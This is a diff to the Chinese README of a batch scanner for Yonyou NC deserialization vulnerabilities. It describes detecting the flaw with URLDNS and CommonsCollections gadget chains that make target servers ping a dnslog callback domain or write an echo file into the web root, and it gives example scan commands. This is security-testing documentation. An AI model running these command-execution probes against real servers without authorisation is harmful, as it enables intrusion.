@@ -5,12 +5,18 @@ yonyouNC 漏洞批量检测工具(无依赖)
 by: xueqi
 
 ## 介绍
+漏洞利用很简单，实现方式也很简单，需要注意
 实现的功能：
-1.出网检测：通过dnslog回显检测存在漏洞的接口
-该方式又分为两种方法：cc链中URLDNS 和 执行ping命令
+**1.出网检测**：通过dnslog回显检测存在漏洞的接口
+该方式又分为两种方法：cc链中**URLDNS** 和 **执行ping命令**
+URLDNS方式不需要判断操作系统，win和linux通用
 执行命令的方法 需要判断目标操作系统，而决定增加`cmd /c ping dnslog`或`/bin/sh -c  “ping -c 1 dnslog“` 防止执行失败
-2.不出网检测：通过执行系统命令写入文本来判断存在漏洞接口
+
+**2.不出网检测**：通过执行系统命令写入文本来判断存在漏洞接口
 该方式需要判断目标操作系统，而决定增加`cmd /c`或`/bin/sh -c ““` 防止执行失败
+
+详情看使用详解部分
+
 ## 使用说明
 ```
 optional arguments:
@@ -33,5 +39,49 @@ xxxxx01.03d30ba4.ipv6.1433.eu.org
 xxxxxxxxxxxxxx01.rggehd.dnslog.cn
 c6xxxxxxxxxxxxxx01.qpnn6a.ceye.io
 ```
+## dnslog格式说明  
+### 检测单个url 
 
-#### 
+`-u http://url` 
+
+dnslog处理格式
+<img width="703" alt="image-20230519162917413" src="https://github.com/hkxueqi/YonyouNc-UNSERIALIZE-scan/assets/42443541/7f4c885b-a0f1-4eb6-98be-26fd7b9c2fa6">
+
+
+### 批量url：
+
+`-f 1.txt #补位变为行数标识`
+
+<img width="674" alt="image-20230519162813383" src="https://github.com/hkxueqi/YonyouNc-UNSERIALIZE-scan/assets/42443541/44c0ccbd-14d3-4a9a-af05-d6e4ec71f431">
+
+## 使用详解
+
+1.使用urldns链 ，通过dnslog出网测试。
+
+`python3 YonyouNcScan2.py -u http://172.16.1.200:8000 -d qpnn6a.ceye.io --exp urldns`
+
+<img width="966" alt="image-20230519155021950" src="https://github.com/hkxueqi/YonyouNc-UNSERIALIZE-scan/assets/42443541/5cbe9d9b-5cae-4715-b5ab-ec0ca92f1fd5">
+
+<img width="756" alt="image-20230519155038819" src="https://github.com/hkxueqi/YonyouNc-UNSERIALIZE-scan/assets/42443541/8c1c8650-99aa-44af-abd5-5fc63cd10db5">
+
+
+2.使用cc6链，执行ping命令 通过dnslog回显
+
+需要指定系统，-e dnswin或 dnslin
+
+`python3 YonyouNcScan2.py -u http://172.16.1.200:8000 -d m4ssvh.dnslog.cn -e dnswin`
+
+<img width="940" alt="image-20230519155210357" src="https://github.com/hkxueqi/YonyouNc-UNSERIALIZE-scan/assets/42443541/e3009fcd-b929-4381-9632-48019b160fd7">
+
+
+2.使用cc6链，执行echo命令 通过重定向符追加到文本至web根目录回显
+
+需要指定系统，-e txtwin或 txtlin；txtwin2使用了cc1链
+
+`python3 YonyouNcScan2.py -u http://172.16.1.200:8000 -d m4ssvh.dnslog.cn -e txtwin`
+
+<img width="791" alt="image-20230519155611731" src="https://github.com/hkxueqi/YonyouNc-UNSERIALIZE-scan/assets/42443541/29c02efe-85e2-4e84-90a4-07a0581ba780">
+
+<img width="629" alt="image-20230519155702982" src="https://github.com/hkxueqi/YonyouNc-UNSERIALIZE-scan/assets/42443541/5e56307b-bfbb-44d1-8ba0-56bea20bc656">
+
+
